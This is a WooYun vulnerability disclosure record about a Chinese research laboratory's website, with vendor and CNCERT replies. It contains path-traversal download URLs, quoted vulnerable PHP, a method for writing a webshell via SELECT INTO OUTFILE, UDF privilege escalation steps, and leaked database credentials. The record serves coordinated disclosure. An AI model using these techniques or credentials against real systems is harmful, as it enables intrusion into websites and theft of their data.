{"id": 82130, "wybug_id": "wooyun-2015-0151992", "wybug_title": "浙江省工程结构与防灾减灾技术研究重点实验室后台弱口令，任意文件下载，源代码分析，最终利用若干漏洞getshell", "wybug_corp": "浙江省工程结构与防灾减灾技术研究重点实验室", "wybug_author": "我在不想理你", "wybug_date": "2015-11-05 11:46", "wybug_open_date": "2015-12-24 11:12", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向公众公开  简要描述： 浙江省工程结构与防灾减灾技术研究重点实验室存在若干漏洞.附源代码审计 详细说明：  浙江省工程结构与防灾减灾技术研究重点实验室http://**.**.**.**/后台弱口令admin/adminhttp://**.**.**.**/admincp.php?mod=login登录后后台无法绕过上传php文件，看到了数据库备份，也无法备份512字节文件名绕过sql后缀，随便点，发现数据库下载的url为：**.**.**.**/admincp.php?mod=down&path=data%2Fbakup%2F&file=bak_20151105112040.sql经过尝试，存在任意文件下载，把代码下来http://**.**.**.**/admincp.php?mod=down&path=data/bakup/&file=../../index.php还有admincp.php登入页面也下载下来http://**.**.**.**/admincp.php?mod=down&path=data/bakup/&file=../../admincp.php源代码审计\n13. $a = base::g('a'); // action34. if ($a=='phpinfo') {35. \tphpinfo();exit();36. }\n所以传入参数a=phpinfo可以查看信息http://**.**.**.**/admincp.php?a=phpinfo找到物理路径D:\\wwwroot\\\n\n审计源代码，发现这个文件可以执行命令http://**.**.**.**/admincp.php?mod=down&path=data/bakup/&file=../../admin/admin_database.php存在命令执行\nif (base::g('mode') == 'execute') {\tbase::issubmit();\t$content = trim(stripslashes(base::p('content')));\tif ($content == '') base::alert('您没有输入SQL语句，无法执行。');\t$str=str_replace(\"\\r\",\"\",str_replace('###_',DB_PREFIX,$content));\t$sqlarr=explode(\";\\n\",trim($str));\t$conn = mysql_connect(DB_HOST.\":\".DB_PORT,DB_USER,DB_PASSWORD) or exit('Connection err!');\tmysql_select_db(DB_NAME,$conn) or exit('Select database err!');\tmysql_query(\"set names 'utf8'\");\t$count = count($sqlarr);\t$err = 0;\t$err_sql = '';\tfor ($i = 0; $i < $count; $i++) {\t\t$sql = str_replace(\"\\n\",' ',$sqlarr[$i]);\t\tif (!mysql_query($sql,$conn)) {\t\t\t$err_status = mysql_errno($conn) . \", \" . mysql_error($conn);\t\t\t$err++;\t\t\t$err_sql .= $sql.\"(Error: \".$err_status.\")\\\\n----------------------------------------\\\\n\";\t\t}\t}\tif ($err>0) {\t\t$err_sql = \"但以下语句没有被执行，请检查：\\\\n----------------------------------------\\\\n \".$err_sql;\t}\tbase::alert('SQL语句已经执行！'.$err_sql,'?mod=admin_database&action=execute');}\n只要对admin/admin_database.php?传入参数action=execute,而且POST包含sql查询语句content数据就可以执行\n\n利用前面找到的物理路径，写入一句话select 一句话into outfile \"D:\\\\wwwroot\\\\back.php\";查看配置文件mysqldefine('APP_SAFECODE','AdgnDBxKK9');define('DB_HOST','localhost');define('DB_PORT','3306');define('DB_NAME','zjgcjg');define('DB_USER','root');define('DB_PASSWORD','zj2015');define('DB_PREFIX','web_');define('DB_ENGINE_NAME','mysqli');define('WEB_DIR','/');直接udf提权拿到system 权限   漏洞证明：  附system权限图\n\n   修复方案：  弱口令,任意文件下载，命令执行补掉   版权声明：转载请注明来源 我在不想理你@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-11-09 11:11 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发对应分中心，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-09 11:46 |    \t\t我在不想理你 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:10        | 人生路漫漫)\t\t \n  @浩天 为什么只给2个rank 求补发 核实    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}